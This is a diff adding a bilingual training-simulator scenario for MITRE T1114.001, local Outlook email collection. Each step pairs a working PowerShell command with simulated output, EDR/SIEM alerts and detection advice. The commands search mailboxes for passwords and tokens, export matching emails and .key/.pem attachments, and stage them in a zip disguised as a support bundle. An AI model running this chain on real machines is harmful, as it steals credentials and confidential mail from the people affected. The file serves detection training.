@@ -1,0 +1,232 @@
+{
+  "id": "T1114.001",
+  "title": "로컬 이메일 수집 시뮬레이션",
+  "titleEn": "Local Email Collection Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚡" },
+    { "label": "침투", "labelEn": "Breach", "icon": "🔓" },
+    { "label": "완료", "labelEn": "Complete", "icon": "✅" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "x": 80, "y": 150, "type": "attacker" },
+    { "id": "target", "label": "Target PC", "x": 280, "y": 150, "type": "server" },
+    { "id": "mailserver", "label": "Mail Server", "x": 280, "y": 50, "type": "server" },
+    { "id": "siem", "label": "EDR/SIEM", "x": 480, "y": 150, "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "target", "label": "PowerShell", "activeStep": 0 },
+    { "from": "mailserver", "to": "target", "label": "OST/PST Sync", "activeStep": 0 },
+    { "from": "target", "to": "target", "label": "Email Parse", "activeStep": 2 },
+    { "from": "target", "to": "siem", "label": "Alert", "activeStep": 3 }
+  ],
+  "desktopIcons": [
+    { "label": "Outlook", "icon": "📧", "alertOnStep": 0 },
+    { "label": "Email Search", "icon": "🔍", "alertOnStep": 3 },
+    { "label": "Archive", "icon": "📦", "alertOnStep": 6 }
+  ],
+  "steps": [
+    {
+      "cmd": "dir /s /b C:\\Users\\{userName}\\AppData\\Local\\Microsoft\\Outlook\\*.ost C:\\Users\\{userName}\\AppData\\Local\\Microsoft\\Outlook\\*.pst 2>nul",
+      "out": "C:\\Users\\{userName}\\AppData\\Local\\Microsoft\\Outlook\\{userName}@{companyName}.com.ost\nC:\\Users\\{userName}\\AppData\\Local\\Microsoft\\Outlook\\archive-2025.pst\nC:\\Users\\{userName}\\AppData\\Local\\Microsoft\\Outlook\\archive-2026.pst",
+      "def": "[EDR] File system search for Outlook data files detected",
+      "defAction": "Process: cmd.exe (PID: 5200)\nPattern: Recursive search for *.ost, *.pst\nPath: Outlook data directory\nResults: 3 files found\nRisk: MEDIUM",
+      "desc": "공격자가 로컬 시스템에서 Outlook 데이터 파일(OST/PST)을 검색합니다. 이메일, 연락처, 일정 등이 포함됩니다.",
+      "descEn": "The attacker searches for Outlook data files (OST/PST) on the local system. These contain emails, contacts, and calendar data.",
+      "stepTitle": "Outlook 파일 검색",
+      "stepTitleEn": "Outlook File Discovery",
+      "feynman": "회사 사무실에서 우편함을 찾는 것과 같습니다. OST/PST 파일은 사용자의 모든 이메일이 저장된 '디지털 우편함'입니다. 이 파일을 찾으면 수천 통의 이메일을 한 번에 열어볼 수 있습니다.",
+      "feynmanEn": "It's like finding someone's mailbox in an office. OST/PST files are 'digital mailboxes' storing all user emails. Finding these files means accessing thousands of emails at once.",
+      "expert": "OST 파일은 Exchange 서버와 동기화되는 오프라인 캐시이고, PST는 로컬 아카이브입니다. T1114.001(Local Email Collection)은 서버 접근 없이 로컬 파일만으로 이메일을 탈취합니다. Outlook 2016+에서 OST 파일은 기본적으로 암호화되지 않으며, MAPI 도구로 직접 파싱할 수 있습니다.",
+      "expertEn": "OST files are offline caches synchronized with Exchange, while PST files are local archives. T1114.001 (Local Email Collection) steals emails using only local files without server access. In Outlook 2016+, OST files are not encrypted by default and can be parsed directly with MAPI tools.",
+      "defTooltip": "Sysmon Event ID 1에서 *.ost, *.pst 확장자를 검색하는 명령을 모니터링하세요. EDR에서 Outlook 데이터 디렉토리에 대한 비정상 접근을 탐지합니다.",
+      "defTooltipEn": "Monitor commands searching for *.ost, *.pst extensions in Sysmon Event ID 1. Detect abnormal access to Outlook data directories in EDR.",
+      "hackerLog": {
+        "title": "outlook_discovery.log",
+        "lines": [
+          { "log": "dir /s /b ...\\Outlook\\*.ost ...\\*.pst", "desc": "💡 로컬 Outlook 데이터 파일(OST/PST)을 재귀적으로 검색합니다" },
+          { "log": "{userName}@{companyName}.com.ost / archive-2025.pst", "desc": "💡 현재 사용 중인 OST와 연도별 아카이브 PST 파일이 발견되었습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "OST (Offline Storage Table)", "desc": "Exchange 서버와 동기화되는 Outlook의 오프라인 캐시 파일로, 모든 이메일 사본이 로컬에 저장됩니다" },
+        { "term": "PST (Personal Storage Table)", "desc": "Outlook의 로컬 이메일 아카이브 파일로, 이메일, 연락처, 일정 등을 저장합니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"Get-ChildItem 'C:\\Users\\{userName}\\AppData\\Local\\Microsoft\\Outlook\\' -Filter '*.ost','*.pst' | Select-Object Name, @{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}}, LastWriteTime\"",
+      "out": "Name                                  SizeMB LastWriteTime\n----                                  ------ -------------\n{userName}@{companyName}.com.ost       2450.67 2026/03/01 09:45:12\narchive-2025.pst                        890.34 2025/12/31 23:59:58\narchive-2026.pst                        345.12 2026/02/28 18:30:00",
+      "def": "[SIEM] Outlook data file enumeration - potential email collection",
+      "defAction": "User: {userName}\nFiles Enumerated: 3 Outlook data files\nTotal Size: 3,686.13 MB\nRisk: MEDIUM",
+      "desc": "발견된 Outlook 데이터 파일의 크기와 최종 수정일을 확인합니다. 약 3.6GB의 이메일 데이터가 존재합니다.",
+      "descEn": "Checks the size and last modified date of discovered Outlook data files. Approximately 3.6GB of email data exists.",
+      "stepTitle": "파일 크기 분석",
+      "stepTitleEn": "File Size Analysis",
+      "feynman": "우편함의 크기와 마지막으로 편지를 받은 날짜를 확인하는 것과 같습니다. 현재 사용 중인 OST가 2.4GB로 가장 크고, 가장 최근 이메일까지 포함합니다. 총 3.6GB의 이메일 데이터는 수천 통의 이메일을 의미합니다.",
+      "feynmanEn": "It's like checking the mailbox size and the last delivery date. The active OST is the largest at 2.4GB and contains the most recent emails. 3.6GB of email data represents thousands of emails.",
+      "expert": "OST 파일 크기가 2.4GB라는 것은 수만 건의 이메일과 첨부파일이 포함되어 있음을 나타냅니다. Outlook 2016+의 기본 OST 크기 제한은 50GB입니다. 파일 크기 분석은 유출 전 대역폭과 시간을 계산하는 데 사용됩니다.",
+      "expertEn": "An OST file size of 2.4GB indicates tens of thousands of emails and attachments. Outlook 2016+'s default OST size limit is 50GB. File size analysis is used to calculate bandwidth and time requirements before exfiltration.",
+      "defTooltip": "DLP에서 Outlook 데이터 파일에 대한 비Outlook 프로세스의 접근을 모니터링하세요. PowerShell이 Outlook 데이터 디렉토리를 열거하는 것은 높은 위험 지표입니다.",
+      "defTooltipEn": "Monitor non-Outlook process access to Outlook data files in DLP. PowerShell enumerating Outlook data directories is a high-risk indicator.",
+      "hackerLog": {
+        "title": "file_analysis.log",
+        "lines": [
+          { "log": "Get-ChildItem ...\\Outlook\\ -Filter '*.ost','*.pst'", "desc": "💡 Outlook 데이터 파일의 상세 정보(크기, 수정일)를 수집합니다" },
+          { "log": "{userName}@{companyName}.com.ost  2450.67 MB", "desc": "💡 2.4GB 크기의 현재 메일박스가 발견되어 대량의 이메일 데이터가 존재합니다" }
+        ]
+      },
+      "terms": [
+        { "term": "LastWriteTime", "desc": "파일이 마지막으로 수정된 시간으로, 가장 최근의 이메일 동기화 시점을 나타냅니다" },
+        { "term": "Data Enumeration", "desc": "탈취 대상 데이터의 위치, 크기, 유형을 파악하는 정찰 활동입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$outlook = New-Object -ComObject Outlook.Application;\n$namespace = $outlook.GetNamespace('MAPI');\n$inbox = $namespace.GetDefaultFolder(6);\nWrite-Host \"Inbox Items: $($inbox.Items.Count)\";\n$inbox.Items | Sort-Object ReceivedTime -Descending | Select-Object -First 10 Subject, SenderName, ReceivedTime | Format-Table -AutoSize\"",
+      "out": "Inbox Items: 4521\n\nSubject                                          SenderName         ReceivedTime\n-------                                          ----------         ------------\nRE: Q1 Budget Approval - CONFIDENTIAL            CFO Kim            2026/03/01 09:30\nVPN Credentials Reset                            IT Helpdesk        2026/03/01 09:15\nBoard Meeting Minutes - Draft                    CEO Park           2026/02/28 17:00\nProject Alpha - Server Access Details            DevOps Team        2026/02/28 15:30\nFW: Client Contract - {companyName} x GlobalTech  Legal Dept         2026/02/28 14:00\nSalary Adjustment Notification                   HR Department      2026/02/28 11:00\nAWS Root Account Recovery                        aws-notify         2026/02/27 16:45\nNew Hire Onboarding - Credentials                IT Admin           2026/02/27 10:00\nQuarterly Security Audit Results                 CISO Office        2026/02/26 14:30\nDatabase Migration Plan - Production             DBA Team           2026/02/26 09:00",
+      "def": "[EDR] Outlook COM automation detected - programmatic email access",
+      "defAction": "Process: powershell.exe (PID: 5400)\nCOM Object: Outlook.Application\nAction: MAPI namespace access, Inbox enumeration\nItems Accessed: 4521 emails\nRisk: HIGH",
+      "desc": "Outlook COM 객체를 사용하여 받은편지함에 프로그래밍적으로 접근합니다. 기밀 이메일 제목이 노출됩니다.",
+      "descEn": "Programmatically accesses the inbox using Outlook COM objects. Confidential email subjects are exposed.",
+      "stepTitle": "이메일 프로그래밍 접근",
+      "stepTitleEn": "Programmatic Email Access",
+      "feynman": "다른 사람의 우편함 열쇠를 복제해서 모든 편지를 자동으로 읽는 로봇을 만드는 것과 같습니다. Outlook COM 객체를 통해 4,521통의 이메일 제목, 발신자, 날짜를 한눈에 볼 수 있습니다. 기밀 예산 승인, VPN 비밀번호 등 민감한 내용이 이미 노출되었습니다.",
+      "feynmanEn": "It's like copying someone's mailbox key and building a robot to read all letters automatically. Through Outlook COM objects, 4,521 email subjects, senders, and dates are visible at a glance. Sensitive content like confidential budget approvals and VPN passwords are already exposed.",
+      "expert": "Outlook.Application COM 객체를 통한 MAPI 접근은 Outlook 프로세스의 보안 컨텍스트를 상속합니다. Outlook Security Guard는 외부 프로세스의 COM 접근 시 경고 대화상자를 표시하지만, 프로그래밍적으로 우회 가능합니다. Exchange Online에서는 Microsoft Graph API를 통한 원격 이메일 수집(T1114.002)이 더 일반적입니다.",
+      "expertEn": "MAPI access via Outlook.Application COM inherits Outlook process's security context. Outlook Security Guard shows warning dialogs for external COM access, but can be bypassed programmatically. In Exchange Online, remote email collection via Microsoft Graph API (T1114.002) is more common.",
+      "defTooltip": "EDR에서 Outlook.Application COM 객체를 비Outlook 프로세스(특히 PowerShell)가 생성하는 것을 모니터링하세요. Sysmon Event ID 1에서 Outlook 관련 COM 호출을 포함하는 PowerShell 프로세스를 탐지합니다.",
+      "defTooltipEn": "Monitor non-Outlook processes (especially PowerShell) creating Outlook.Application COM objects in EDR. Detect PowerShell processes with Outlook COM calls in Sysmon Event ID 1.",
+      "hackerLog": {
+        "title": "com_access.log",
+        "lines": [
+          { "log": "New-Object -ComObject Outlook.Application", "desc": "💡 PowerShell에서 Outlook COM 객체를 생성하여 이메일에 프로그래밍적으로 접근합니다" },
+          { "log": "Inbox Items: 4521", "desc": "💡 4,521통의 이메일이 검색 가능한 상태로 노출되었습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "COM (Component Object Model)", "desc": "Windows 프로세스 간 통신을 위한 인터페이스로, Outlook 자동화에 사용됩니다" },
+        { "term": "MAPI (Messaging Application Programming Interface)", "desc": "이메일 클라이언트가 메시징 시스템과 통신하는 데 사용하는 Microsoft API입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$outlook = New-Object -ComObject Outlook.Application;\n$ns = $outlook.GetNamespace('MAPI');\n$inbox = $ns.GetDefaultFolder(6);\n$keywords = @('password','credential','vpn','secret','confidential','access key','token');\n$results = @();\nforeach($item in $inbox.Items) {\n  foreach($kw in $keywords) {\n    if($item.Subject -match $kw -or $item.Body -match $kw) {\n      $results += [PSCustomObject]@{Subject=$item.Subject;From=$item.SenderName;Date=$item.ReceivedTime};\n      break\n    }\n  }\n}\nWrite-Host \"Found $($results.Count) sensitive emails\";\n$results | Select-Object -First 8 | Format-Table -AutoSize\"",
+      "out": "Found 47 sensitive emails\n\nSubject                                      From            Date\n-------                                      ----            ----\nVPN Credentials Reset                        IT Helpdesk     2026/03/01 09:15\nAWS Root Account Recovery                    aws-notify      2026/02/27 16:45\nNew Hire Onboarding - Credentials            IT Admin        2026/02/27 10:00\nFW: Production DB Password Rotation          DBA Team        2026/02/25 11:00\nAPI Access Token - Renewed                   DevOps Team     2026/02/24 15:30\nRE: VPN Secret Key Distribution              Network Team    2026/02/23 09:00\nConfidential: M&A Target List 2026           CEO Park        2026/02/20 14:00\nService Account Password Change              AD Admin        2026/02/19 10:30",
+      "def": "[SIEM] Keyword-based email search detected - credential harvesting pattern",
+      "defAction": "Process: powershell.exe (PID: 5400)\nKeywords: password, credential, vpn, secret, confidential, access key, token\nMatches: 47 emails\nPattern: Credential harvesting via email search\nRisk: CRITICAL",
+      "desc": "비밀번호, 인증정보 등의 키워드로 이메일을 검색하여 민감한 정보가 포함된 47개 이메일을 식별합니다.",
+      "descEn": "Searches emails by keywords like password and credentials, identifying 47 emails containing sensitive information.",
+      "stepTitle": "키워드 기반 이메일 검색",
+      "stepTitleEn": "Keyword-Based Email Search",
+      "feynman": "수천 통의 편지에서 '비밀번호', '기밀' 같은 단어가 적힌 편지만 골라내는 것과 같습니다. 4,521통 중 47통이 민감한 정보를 담고 있으며, VPN 비밀번호, AWS 계정, M&A 정보 등 회사의 핵심 비밀이 포함되어 있습니다.",
+      "feynmanEn": "It's like sorting through thousands of letters to find only those containing words like 'password' or 'confidential'. 47 out of 4,521 contain sensitive information including VPN passwords, AWS accounts, and M&A intelligence.",
+      "expert": "키워드 기반 이메일 검색은 APT 그룹의 표준 이메일 수집 전략입니다. 'password', 'credential', 'secret'은 보안 자격 증명을, 'confidential'은 기업 기밀을 타겟합니다. DLP에서 이메일에 비밀번호를 평문으로 보내는 것을 차단하는 정책이 근본적 방어 수단입니다.",
+      "expertEn": "Keyword-based email search is a standard APT email collection strategy. 'password', 'credential', 'secret' target security credentials while 'confidential' targets corporate secrets. DLP policies blocking plaintext passwords in emails are the fundamental defense measure.",
+      "defTooltip": "PowerShell 스크립트 블록 로깅(Event ID 4104)에서 'password', 'credential', 'secret' 등의 키워드 검색 패턴을 탐지하세요. Outlook COM과 함께 키워드 검색이 발생하면 즉시 알림을 발생시킵니다.",
+      "defTooltipEn": "Detect keyword search patterns like 'password', 'credential', 'secret' in PowerShell Script Block Logging (Event ID 4104). Generate immediate alerts when keyword searches occur with Outlook COM.",
+      "hackerLog": {
+        "title": "keyword_search.log",
+        "lines": [
+          { "log": "$keywords = @('password','credential','vpn','secret','confidential'...)", "desc": "💡 민감 정보를 식별하기 위한 키워드 목록을 정의합니다" },
+          { "log": "Found 47 sensitive emails", "desc": "💡 4,521통 중 47통에서 자격 증명 관련 키워드가 발견되었습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Credential Harvesting", "desc": "이메일, 파일, 메모리 등에서 사용자 인증 정보를 체계적으로 수집하는 공격 기법입니다" },
+        { "term": "Keyword Search", "desc": "특정 키워드를 기반으로 대량의 데이터에서 민감한 정보를 자동으로 필터링하는 기법입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$outlook = New-Object -ComObject Outlook.Application;\n$ns = $outlook.GetNamespace('MAPI');\n$inbox = $ns.GetDefaultFolder(6);\n$exportPath = 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\email_export';\nNew-Item -ItemType Directory -Path $exportPath -Force | Out-Null;\n$count = 0;\nforeach($item in $inbox.Items) {\n  if($item.Subject -match 'credential|password|vpn|secret|token') {\n    $item.SaveAs(\\\"$exportPath\\email_$count.msg\\\", 3);\n    $count++;\n    if($count -ge 47) { break }\n  }\n}\nWrite-Host \\\"Exported $count emails to $exportPath\\\"\"",
+      "out": "Exported 47 emails to C:\\Users\\{userName}\\AppData\\Local\\Temp\\email_export",
+      "def": "[EDR] Mass email export detected - 47 emails saved to disk",
+      "defAction": "Process: powershell.exe (PID: 5400)\nAction: Outlook.MailItem.SaveAs (MSG format)\nExport Path: %TEMP%\\email_export\\\nFiles Created: 47 MSG files\nRisk: CRITICAL\nAction: Directory access blocked",
+      "desc": "식별된 민감 이메일 47건을 MSG 형식으로 임시 디렉토리에 저장합니다.",
+      "descEn": "Saves 47 identified sensitive emails in MSG format to a temporary directory.",
+      "stepTitle": "이메일 파일 추출",
+      "stepTitleEn": "Email File Extraction",
+      "feynman": "중요한 편지를 골라서 복사기로 사본을 만드는 것과 같습니다. 47통의 민감한 이메일을 MSG 파일로 저장하면, 나중에 Outlook 없이도 내용을 읽을 수 있습니다. 비밀번호, VPN 키, 기밀 계약서 등이 모두 파일로 유출됩니다.",
+      "feynmanEn": "It's like selecting important letters and making photocopies. Saving 47 sensitive emails as MSG files means they can be read later without Outlook. Passwords, VPN keys, and confidential contracts are all exfiltrated as files.",
+      "expert": "MailItem.SaveAs에서 형식 3은 MSG(Outlook Message Format)입니다. MSG 파일은 독립적으로 읽을 수 있어 유출에 적합합니다. 대량의 SaveAs 호출은 Outlook Security Model의 Object Model Guard를 트리거할 수 있지만, 레지스트리 수정(HKCU\\Software\\Policies\\Microsoft\\Office)으로 우회 가능합니다.",
+      "expertEn": "MailItem.SaveAs format 3 is MSG (Outlook Message Format). MSG files are self-contained and readable independently, suitable for exfiltration. Bulk SaveAs calls may trigger Outlook Security Model's Object Model Guard, bypassable via registry modification (HKCU\\Software\\Policies\\Microsoft\\Office).",
+      "defTooltip": "Sysmon Event ID 11에서 %TEMP% 하위에 다수의 .msg 파일이 생성되는 패턴을 모니터링하세요. Outlook 프로세스와 PowerShell 프로세스 간의 COM 통신도 EDR에서 추적합니다.",
+      "defTooltipEn": "Monitor Sysmon Event ID 11 for patterns of multiple .msg files created under %TEMP%. Also track COM communication between Outlook and PowerShell processes in EDR.",
+      "hackerLog": {
+        "title": "email_export.log",
+        "lines": [
+          { "log": "$item.SaveAs(\"$exportPath\\email_$count.msg\", 3)", "desc": "💡 각 이메일을 MSG 형식(형식 코드 3)으로 디스크에 저장합니다" },
+          { "log": "Exported 47 emails to ...\\email_export", "desc": "💡 47건의 민감 이메일이 성공적으로 파일로 추출되었습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "MSG Format", "desc": "Outlook의 독립형 이메일 파일 형식으로, 첨부파일과 메타데이터를 모두 포함합니다" },
+        { "term": "SaveAs", "desc": "Outlook COM의 메서드로, 이메일을 다양한 형식(MSG, HTML, TXT)으로 파일에 저장합니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$outlook = New-Object -ComObject Outlook.Application;\n$ns = $outlook.GetNamespace('MAPI');\n$inbox = $ns.GetDefaultFolder(6);\n$attachPath = 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\email_export\\attachments';\nNew-Item -ItemType Directory -Path $attachPath -Force | Out-Null;\n$count = 0;\nforeach($item in $inbox.Items) {\n  if($item.Attachments.Count -gt 0) {\n    foreach($att in $item.Attachments) {\n      if($att.FileName -match '\\.(xlsx?|docx?|pdf|csv|key|pem)$') {\n        $att.SaveAsFile(\\\"$attachPath\\$($att.FileName)\\\");\n        $count++;\n      }\n    }\n  }\n}\nWrite-Host \\\"Extracted $count sensitive attachments\\\"\"",
+      "out": "Extracted 23 sensitive attachments",
+      "def": "[SIEM] Bulk email attachment extraction detected",
+      "defAction": "Process: powershell.exe (PID: 5400)\nAction: Attachment extraction (xlsx, docx, pdf, csv, key, pem)\nFiles Extracted: 23 attachments\nTarget Path: %TEMP%\\email_export\\attachments\\\nRisk: CRITICAL",
+      "desc": "이메일 첨부파일 중 문서, 스프레드시트, 인증서 파일 등 민감한 형식의 파일 23개를 추출합니다.",
+      "descEn": "Extracts 23 files with sensitive formats including documents, spreadsheets, and certificate files from email attachments.",
+      "stepTitle": "첨부파일 추출",
+      "stepTitleEn": "Attachment Extraction",
+      "feynman": "편지에 동봉된 중요한 서류만 따로 빼내는 것과 같습니다. 이메일에 첨부된 엑셀 파일(재무 데이터), PDF(계약서), 인증서 파일(.key, .pem) 등 23개의 핵심 문서를 추출합니다.",
+      "feynmanEn": "It's like pulling out important enclosed documents from letters. Extracts 23 key documents attached to emails including Excel files (financial data), PDFs (contracts), and certificate files (.key, .pem).",
+      "expert": "첨부파일 추출에서 .key, .pem 확장자는 SSL/TLS 인증서와 개인키를 나타내며, 이들이 유출되면 MITM 공격이나 서비스 위장이 가능합니다. .csv 파일은 종종 대량의 사용자 데이터나 재무 데이터를 포함합니다. DLP에서 이메일 첨부파일 유형을 정책적으로 제한하는 것이 근본적 방어입니다.",
+      "expertEn": "In attachment extraction, .key and .pem extensions indicate SSL/TLS certificates and private keys - their exfiltration enables MITM attacks or service impersonation. CSV files often contain bulk user or financial data. DLP policy restrictions on email attachment types are the fundamental defense.",
+      "defTooltip": "EDR에서 이메일 첨부파일이 %TEMP% 디렉토리에 대량으로 저장되는 패턴을 모니터링하세요. 특히 .pem, .key, .pfx 등 인증서 관련 파일의 비정상 추출은 최우선 알림으로 설정합니다.",
+      "defTooltipEn": "Monitor patterns of bulk email attachment saves to %TEMP% directories in EDR. Set top-priority alerts for abnormal extraction of certificate files (.pem, .key, .pfx).",
+      "hackerLog": {
+        "title": "attachment_extract.log",
+        "lines": [
+          { "log": "$att.FileName -match '\\.(xlsx?|docx?|pdf|csv|key|pem)$'", "desc": "💡 민감한 파일 형식(오피스, PDF, 인증서)만 선택적으로 필터링합니다" },
+          { "log": "Extracted 23 sensitive attachments", "desc": "💡 23개의 첨부파일이 추출되었으며, 인증서 파일이 포함될 수 있습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "PEM/KEY File", "desc": "SSL/TLS 인증서의 개인키 파일로, 유출 시 암호화된 통신을 해독할 수 있습니다" },
+        { "term": "Attachment Extraction", "desc": "이메일 첨부파일을 프로그래밍적으로 분리하여 디스크에 저장하는 기법입니다" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"Compress-Archive -Path 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\email_export' -DestinationPath 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\support_bundle.zip' -Force; $f = Get-Item 'C:\\Users\\{userName}\\AppData\\Local\\Temp\\support_bundle.zip'; Write-Host \\\"Archive: $($f.Name) | Size: $([math]::Round($f.Length/1MB,2)) MB\\\"\"",
+      "out": "Archive: support_bundle.zip | Size: 34.56 MB",
+      "def": "[EDR] Email data compressed for potential exfiltration",
+      "defAction": "Process: powershell.exe (PID: 5400)\nAction: Compress-Archive\nSource: 47 emails + 23 attachments\nOutput: support_bundle.zip (34.56 MB)\nDisguise: Named as support bundle\nRisk: CRITICAL\nAction: File quarantine initiated",
+      "desc": "수집된 이메일과 첨부파일을 'support_bundle.zip'으로 위장하여 압축합니다. 유출 준비가 완료됩니다.",
+      "descEn": "Compresses collected emails and attachments disguised as 'support_bundle.zip'. Data is staged for exfiltration.",
+      "stepTitle": "유출 준비 완료",
+      "stepTitleEn": "Exfiltration Staging Complete",
+      "feynman": "훔친 모든 서류를 '기술 지원 자료'라고 적힌 가방에 넣는 것과 같습니다. 47통의 이메일과 23개의 첨부파일을 하나의 ZIP 파일로 압축하고, 파일 이름을 평범한 지원 번들로 위장하여 누군가 발견해도 의심을 사지 않도록 합니다.",
+      "feynmanEn": "It's like putting all stolen documents in a bag labeled 'technical support materials'. Compresses 47 emails and 23 attachments into a single ZIP file, disguised with a mundane support bundle name to avoid suspicion if discovered.",
+      "expert": "support_bundle.zip이라는 파일명은 IT 지원 파일로의 위장(T1036.005)입니다. DLP 시스템의 파일명 기반 화이트리스트를 우회할 수 있습니다. 방어를 위해 DLP에서 파일 내용(매직 바이트, 엔트로피) 분석과 파일 크기 이상 탐지를 수행해야 합니다. %TEMP%에서 대용량 ZIP 생성은 높은 위험 지표입니다.",
+      "expertEn": "The filename support_bundle.zip is masquerading as IT support files (T1036.005). Can bypass DLP filename-based whitelists. Defense requires DLP content analysis (magic bytes, entropy) and file size anomaly detection. Large ZIP creation in %TEMP% is a high-risk indicator.",
+      "defTooltip": "DLP에서 %TEMP% 디렉토리에서 생성되는 대용량 ZIP 파일을 모니터링하세요. 압축 파일 내부에 .msg, .pem, .key 파일이 포함된 경우 데이터 유출 시도로 판단합니다.",
+      "defTooltipEn": "Monitor large ZIP file creation in %TEMP% directories with DLP. ZIP files containing .msg, .pem, .key files should be flagged as exfiltration attempts.",
+      "hackerLog": {
+        "title": "staging.log",
+        "lines": [
+          { "log": "Compress-Archive ... -DestinationPath '...\\support_bundle.zip'", "desc": "💡 이메일 데이터를 IT 지원 파일로 위장한 ZIP으로 압축합니다" },
+          { "log": "Archive: support_bundle.zip | Size: 34.56 MB", "desc": "💡 34.56MB의 이메일 데이터가 유출 준비 완료되었습니다" }
+        ]
+      },
+      "terms": [
+        { "term": "Data Staging (T1074)", "desc": "유출 전에 수집된 데이터를 한 위치에 모아 압축하는 준비 단계입니다" },
+        { "term": "Masquerading (T1036)", "desc": "악성 파일을 정상 파일처럼 보이도록 이름, 아이콘, 확장자를 위장하는 기법입니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "cmd.exe (PID: 5200)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "dir.exe (OST/PST search)", "depth": 2, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 5400)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "Outlook.Application [COM]", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "MAPI Namespace → Inbox (4521 items)", "depth": 3, "alert": true, "minStep": 2 },
+    { "name": "Keyword Search (47 matches)", "depth": 3, "alert": true, "minStep": 3 },
+    { "name": "SaveAs → email_export\\ (47 MSG)", "depth": 3, "alert": true, "minStep": 4 },
+    { "name": "Attachment Extract (23 files)", "depth": 3, "alert": true, "minStep": 5 },
+    { "name": "Compress-Archive → support_bundle.zip", "depth": 2, "alert": true, "minStep": 6 }
+  ]
+}
